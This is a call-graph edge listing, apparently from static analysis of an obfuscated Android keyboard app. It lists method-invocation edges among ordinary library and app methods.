VIRTUAL edge: $z0 = virtualinvoke $r3.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l3, $i1, $i2) in <j$.util.concurrent.ConcurrentHashMap: void q(int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<ivv: ivw b(java.lang.String)>($r0) in <ivw: ivw f(java.lang.String)> ==> <ivv: ivw b(java.lang.String)>
SPECIAL edge: specialinvoke $r3.<java.util.NoSuchElementException: void <init>()>() in <liz: java.lang.Object next()> ==> <java.util.NoSuchElementException: void <init>()>
SPECIAL edge: specialinvoke $r11.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r3.<java.lang.IndexOutOfBoundsException: void <init>()>() in <lsm: java.lang.Object e(int)> ==> <java.lang.IndexOutOfBoundsException: void <init>()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(6) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r5.<java.lang.AssertionError: void <init>(java.lang.Object)>("Cannot find field:") in <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)> ==> <java.lang.AssertionError: void <init>(java.lang.Object)>
CLINIT edge: staticinvoke <ljs: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ljs: void <clinit>()>
VIRTUAL edge: $r5 = virtualinvoke $r1.<j$.util.concurrent.q: j$.util.concurrent.l c()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.q: j$.util.concurrent.l c()>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorTrendingMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(8) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(8) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
SPECIAL edge: specialinvoke $r2.<java.util.AbstractMap$SimpleImmutableEntry: void <init>(java.lang.Object,java.lang.Object)>($r1, $r3) in <lvr: java.util.Map$Entry d(java.lang.String,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: void <init>(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(0) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
STATIC edge: $r3 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(9) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $i0 = virtualinvoke $r6.<java.lang.Enum: int ordinal()>() in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <java.lang.Enum: int ordinal()>
CLINIT edge: staticinvoke <com.google.android.apps.inputmethod.latin.ImeLatinApp: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <com.google.android.apps.inputmethod.latin.ImeLatinApp: void <clinit>()>
INTERFACE edge: $r9 = interfaceinvoke $r7.<java.util.Map$Entry: java.lang.Object getValue()>() in <lvr: void <init>(lvr,lvr)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
STATIC edge: staticinvoke <java.util.Collections: void sort(java.util.List)>($r3) in <ivv: ivw a()> ==> <java.util.Collections: void sort(java.util.List)>
STATIC edge: staticinvoke <lvm: void h(boolean,java.lang.String)>($z0, "injected class name is empty") in <lsh: lsh j(java.lang.String)> ==> <lvm: void h(boolean,java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>($r4) in <ivw: boolean equals(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r7) in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<liz: java.lang.Object a(int)>($i0) in <liz: java.lang.Object next()> ==> <liw: java.lang.Object a(int)>
SPECIAL edge: $i0 = specialinvoke r0.<ivv: int h()>() in <ivv: ivw a()> ==> <ivv: int h()>
CLINIT edge: staticinvoke <lpi: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lpi: void <clinit>()>
CLINIT edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <j$.util.concurrent.ConcurrentHashMap: void <clinit>()>
SPECIAL edge: specialinvoke r0.<lsd: void <init>(java.util.logging.Level)>($r2) in <lsf: void <init>(lsh,java.util.logging.Level)> ==> <lsd: void <init>(java.util.logging.Level)>
STATIC edge: $r6 = staticinvoke <ivw: ivw f(java.lang.String)>("zz") in <hnt: void <clinit>()> ==> <ivw: ivw f(java.lang.String)>
VIRTUAL edge: $r10 = virtualinvoke $r10.<java.lang.Throwable: java.lang.Throwable getCause()>() in <luk: lum a(java.lang.String[])> ==> <java.lang.Throwable: java.lang.Throwable getCause()>
SPECIAL edge: specialinvoke r0.<lsq: void <init>()>() in <lsp: void <init>(java.lang.String,java.lang.String,int,java.lang.String)> ==> <lsq: void <init>()>
STATIC edge: $r17 = staticinvoke <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>($z0) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>
VIRTUAL edge: $r17 = virtualinvoke $r15.<java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])>($r16) in <lvm: lum j()> ==> <java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])>
SPECIAL edge: specialinvoke $r0.<lqk: void <init>()>() in <lqk: void <clinit>()> ==> <lqk: void <init>()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke $r0.<java.lang.String: char[] toCharArray()>() in <iwt: char[] s(java.lang.String,char,char,int)> ==> <java.lang.String: char[] toCharArray()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
VIRTUAL edge: $r5 = virtualinvoke r0.<lsn: lsw i(lsq)>($r4) in <lsn: lsw j(java.lang.String,java.lang.String,int,java.lang.String)> ==> <lsn: lsw i(lsq)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(3) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c1) in <ivw: boolean F(java.lang.String)> ==> <ivw: boolean u(char)>
VIRTUAL edge: $r1 = virtualinvoke $r1.<java.lang.String: java.lang.String concat(java.lang.String)>($r3) in <hcb: void <init>()> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Boolean: java.lang.Boolean valueOf(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
CLINIT edge: staticinvoke <java.lang.Long: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Long: void <clinit>()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r4) in <lvs: lvs a(java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<java.lang.String: void <init>(char[])>($r1) in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: void <init>(char[])>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: void setLength(int)>(0) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: void setLength(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <ivw: void <init>(ivv,java.lang.String)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.String: java.lang.String concat(java.lang.String)>($r2) in <ivv: void f(java.lang.String)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
VIRTUAL edge: $r6 = virtualinvoke r0.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>
SPECIAL edge: $i0 = specialinvoke r0.<java.util.AbstractMap: int hashCode()>() in <lvr: int hashCode()> ==> <java.util.AbstractMap: int hashCode()>
SPECIAL edge: specialinvoke $r1.<java.util.concurrent.atomic.AtomicLong: void <init>()>() in <lsu: void <init>()> ==> <java.util.concurrent.atomic.AtomicLong: void <init>()>
INTERFACE edge: interfaceinvoke $r2.<java.util.List: boolean add(java.lang.Object)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.util.ArrayList: boolean add(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r2.<ivv: void e(java.lang.String)>($r4) in <ivw: ivw d(java.util.Locale)> ==> <ivv: void e(java.lang.String)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <ivv: void e(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <gcs: void <init>(hbv,lma,int)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke r0.<lsn: void ab(java.lang.String,java.lang.Object[])>($r1, $r4) in <lsn: void F(java.lang.String,java.lang.Object,java.lang.Object)> ==> <lsn: void ab(java.lang.String,java.lang.Object[])>
SPECIAL edge: specialinvoke $r2.<liy: void <init>(ljd)>(r0) in <ljd: java.util.Set entrySet()> ==> <liy: void <init>(ljd)>
SPECIAL edge: specialinvoke $r0.<lkm: void <init>(lkq,int)>($r1, 0) in <lkq: void <clinit>()> ==> <lkm: void <init>(lkq,int)>
VIRTUAL edge: $r4 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.String toString()>() in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.String toString()>
CLINIT edge: staticinvoke <lvr: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lvr: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke $r5.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lsd: boolean b(lsr)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<lqq: void <init>(java.lang.Object,java.lang.Object[],int)>(null, $r1, 0) in <lqq: void <clinit>()> ==> <lqq: void <init>(java.lang.Object,java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r4.<oru: void <init>()>() in <ose: void <clinit>()> ==> <oru: void <init>()>
STATIC edge: $r5 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r5) in <lly: lma g()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $r6 = virtualinvoke $r7.<lsq: java.lang.String b()>() in <lsc: void f(java.lang.String,ltn)> ==> <lso: java.lang.String b()>
SPECIAL edge: $i0 = specialinvoke r0.<qj: int i(java.lang.Object,int)>($r1, $i0) in <qj: int b(java.lang.Object)> ==> <qj: int i(java.lang.Object,int)>
STATIC edge: $r1 = staticinvoke <lkq: lkq h(java.lang.Object[],int)>($r2, $i0) in <lkl: lkq g()> ==> <lkq: lkq h(java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r3.<ltc: void <init>(java.lang.String,int,int)>("LARGE", 2, 50) in <ltc: void <clinit>()> ==> <ltc: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r1.<gsv: void <init>()>() in <com.google.android.apps.inputmethod.latin.LatinApp: void <clinit>()> ==> <gsv: void <init>()>
VIRTUAL edge: $r4 = virtualinvoke $r2.<java.lang.Object: java.lang.Class getClass()>() in <lvs: lvs a(java.lang.Object)> ==> <java.lang.Object: java.lang.Class getClass()>
INTERFACE edge: $r5 = interfaceinvoke $r6.<java.util.Map$Entry: java.lang.Object getValue()>() in <hbv: void j()> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(19) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r2 = staticinvoke <lkq: lkq q()>() in <lqs: void <clinit>()> ==> <lkq: lkq q()>
STATIC edge: $z0 = staticinvoke <ojg: boolean f(java.lang.Object,java.lang.Object)>($r1, $r4) in <qj: int i(java.lang.Object,int)> ==> <ojg: boolean f(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(12) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke r0.<lje: void a()>() in <lje: java.lang.Object next()> ==> <lje: void a()>
VIRTUAL edge: $r5 = virtualinvoke $r2.<lts: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <ltr: java.lang.Object d(lsz)>
STATIC edge: $z0 = staticinvoke <ivw: boolean z(java.lang.String)>($r2) in <ivv: void e(java.lang.String)> ==> <ivw: boolean z(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<hcb: void <init>()>() in <hcb: void <clinit>()> ==> <hcb: void <init>()>
VIRTUAL edge: $r5 = virtualinvoke $r12.<lts: java.lang.Object d(lsz)>($r13) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsm: java.lang.Object d(lsz)>
STATIC edge: $r0 = staticinvoke <lkq: lkq h(java.lang.Object[],int)>($r1, $i0) in <lkq: lkq g(java.lang.Object[])> ==> <lkq: lkq h(java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r1.<java.util.ArrayList: void <init>(int)>(3) in <ivv: void <init>()> ==> <java.util.ArrayList: void <init>(int)>
STATIC edge: staticinvoke <iwt: void r(char[],int,int,char,char,int)>($r0, $i0, $i1, 97, 122, $i2) in <iwt: void g(char[],int,int)> ==> <iwt: void r(char[],int,int,char,char,int)>
CLINIT edge: staticinvoke <hbw: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hbw: void <clinit>()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(", parameter ") in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Enum: void <init>(java.lang.String,int)>($r1, $i0) in <mag: void <init>(java.lang.String,int,int)> ==> <java.lang.Enum: void <init>(java.lang.String,int)>
SPECIAL edge: $r7 = specialinvoke $r2.<lvr: java.util.Map$Entry c(int)>($i5) in <lvr: void <init>(lvr,lvr)> ==> <lvr: java.util.Map$Entry c(int)>
SPECIAL edge: specialinvoke $r4.<mag: void <init>(java.lang.String,int,int)>("GIS_GIF_FULL_IMAGE", 4, 4) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lli: void <init>()> ==> <java.lang.Object: void <init>()>
STATIC edge: $r2 = staticinvoke <android.util.Base64: java.lang.String encodeToString(byte[],int)>($r1, 3) in <kes: java.lang.String k(nfe)> ==> <android.util.Base64: java.lang.String encodeToString(byte[],int)>
SPECIAL edge: specialinvoke r0.<ljb: void a()>() in <ljb: java.lang.Object getValue()> ==> <ljb: void a()>
VIRTUAL edge: virtualinvoke $r30.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r3) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $z0 = staticinvoke <iwt: boolean o(char)>($c0) in <iwt: java.lang.String d(java.lang.String)> ==> <iwt: boolean o(char)>
VIRTUAL edge: $z0 = virtualinvoke r0.<nzh: boolean e()>() in <nzh: boolean f(ivv)> ==> <nzh: boolean e()>
STATIC edge: $i0 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
INTERFACE edge: $z0 = interfaceinvoke $r2.<java.util.List: boolean isEmpty()>() in <ivv: int h()> ==> <java.util.ArrayList: boolean isEmpty()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lta: int hashCode()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lta: void <init>(lsr,java.lang.Object)> ==> <java.lang.Object: void <init>()>
CLINIT edge: staticinvoke <android.view.View: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <android.view.View: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: boolean equals(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke r0.<lvq: int b()>() in <lvq: int size()> ==> <lvq: int b()>
SPECIAL edge: specialinvoke r0.<java.lang.Exception: void <init>()>() in <java.lang.RuntimeException: void <init>(java.lang.String)> ==> <java.lang.Exception: void <init>()>
SPECIAL edge: specialinvoke r0.<lts: void <init>()>() in <lsm: void <init>()> ==> <lts: void <init>()>
SPECIAL edge: specialinvoke $r27.<mag: void <init>(java.lang.String,int,int)>("TENOR_FEATURED_METADATA", 27, 27) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ivv: java.lang.String c()>() in <ivv: ivw a()> ==> <ivv: java.lang.String c()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lup: void <init>(lwc,java.lang.String)> ==> <java.lang.Object: void <init>()>
STATIC edge: staticinvoke <ojg: void v(java.lang.String)>($r1) in <ojg: void d(java.lang.Object,java.lang.String)> ==> <ojg: void v(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.NullPointerException: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r3 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r0) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<lkg: void <init>(int)>(4) in <lkl: void <init>()> ==> <lkg: void <init>(int)>
VIRTUAL edge: $r4 = virtualinvoke $r2.<java.lang.Class: java.lang.reflect.Field getDeclaredField(java.lang.String)>($r3) in <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)> ==> <java.lang.Class: java.lang.reflect.Field getDeclaredField(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(1) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
INTERFACE edge: $i8 = interfaceinvoke $r14.<java.util.Comparator: int compare(java.lang.Object,java.lang.Object)>($r9, $r15) in <lvr: void <init>(lvr,lvr)> ==> <jlu: int compare(java.lang.Object,java.lang.Object)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("Uncategorized", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
STATIC edge: staticinvoke <iej: void g(java.lang.String,iec)>("InputMethodEntryManager_ImeListLoaded", $r4) in <hnt: void <clinit>()> ==> <iej: void g(java.lang.String,iec)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lfc: void <init>(lfa)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.StringBuilder: int length()>() in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: int length()>
STATIC edge: $z0 = staticinvoke <lvr: boolean e(int,int)>($i0, $i4) in <lvr: void <init>(lvr,lvr)> ==> <lvr: boolean e(int,int)>
STATIC edge: $r5 = staticinvoke <java.util.Arrays: int[] copyOf(int[],int)>($r5, $i0) in <lvr: void <init>(lvr,lvr)> ==> <java.util.Arrays: int[] copyOf(int[],int)>
INTERFACE edge: $r7 = interfaceinvoke $r2.<ltn: lsq f()>() in <lsc: void f(java.lang.String,ltn)> ==> <lsn: lsq f()>
SPECIAL edge: specialinvoke r0.<java.lang.Throwable: void <init>()>() in <java.lang.Exception: void <init>(java.lang.String,java.lang.Throwable)> ==> <java.lang.Throwable: void <init>()>
SPECIAL edge: specialinvoke $r5.<java.lang.StringBuilder: void <init>()>() in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: $r1 = staticinvoke <lri: java.util.ArrayList N()>() in <lri: java.util.ArrayList P(java.util.Iterator)> ==> <lri: java.util.ArrayList N()>
STATIC edge: $r5 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r4) in <lvs: lvs a(java.lang.Object)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <j$.util.concurrent.k: boolean equals(java.lang.Object)> ==> <lvt: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Error: void <init>()>() in <java.lang.LinkageError: void <init>()> ==> <java.lang.Error: void <init>()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r1, $r2) in <lli: void e(java.lang.Object,java.lang.Object)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <jvu: void <init>(int)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r7 = virtualinvoke $r0.<hcb: hbv j(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object,java.lang.Object)>($r1, $r2, $r3, $r6) in <hbu: hbs f(java.lang.String,long)> ==> <hcb: hbv j(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(4) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
INTERFACE edge: interfaceinvoke $r1.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r4, $r6) in <iej: void g(java.lang.String,iec)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(float[],float[])>($r14, $r15) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(float[],float[])>
STATIC edge: $r17 = staticinvoke <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>($z0) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <j$.util.concurrent.k: boolean equals(java.lang.Object)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke r0.<lkq: int size()>() in <lkq: lsb C(int)> ==> <lqm: int size()>
VIRTUAL edge: $r5 = virtualinvoke $r7.<lsm: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object d(lsz)>
VIRTUAL edge: $c0 = virtualinvoke $r0.<java.lang.String: char charAt(int)>($i1) in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: char charAt(int)>
VIRTUAL edge: $r4 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.String toString()>() in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("Autocomplete", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
SPECIAL edge: specialinvoke $r0.<jvu: void <init>(int)>(1) in <jvu: void <clinit>()> ==> <jvu: void <init>(int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <java.lang.String: int hashCode()>
INTERFACE edge: $z0 = interfaceinvoke $r2.<java.util.Set: boolean add(java.lang.Object)>($r1) in <ljf: boolean add(java.lang.Object)> ==> <java.util.HashSet: boolean add(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r0.<androidx.lifecycle.ProcessLifecycleOwnerInitializer: int delete(android.net.Uri,java.lang.String,java.lang.String[])>(null, "", $r2) in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <androidx.lifecycle.ProcessLifecycleOwnerInitializer: int delete(android.net.Uri,java.lang.String,java.lang.String[])>
VIRTUAL edge: $r7 = virtualinvoke $r4.<nzh: java.lang.String c()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: java.lang.String c()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Long: java.lang.Long valueOf(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <ojg: void h(java.lang.Throwable)>($r2) in <ojg: void c(java.lang.Object,java.lang.String)> ==> <ojg: void h(java.lang.Throwable)>
SPECIAL edge: specialinvoke r0.<lkg: void c(java.lang.Object)>($r1) in <lkl: void h(java.lang.Object)> ==> <lkg: void c(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
CLINIT edge: staticinvoke <lkh: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lkh: void <clinit>()>
INTERFACE edge: interfaceinvoke $r9.<lse: void F(java.lang.String,java.lang.Object,java.lang.Object)>("Locale %s has invalid country code: %s", $r0, $r6) in <ivw: ivw d(java.util.Locale)> ==> <lsv: void F(java.lang.String,java.lang.Object,java.lang.Object)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("].") in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
CLINIT edge: staticinvoke <java.lang.Float: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Float: void <clinit>()>
STATIC edge: $r7 = staticinvoke <lvs: lvs a(java.lang.Object)>($r2) in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <lvs: lvs a(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Exception: void <init>(java.lang.String,java.lang.Throwable)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
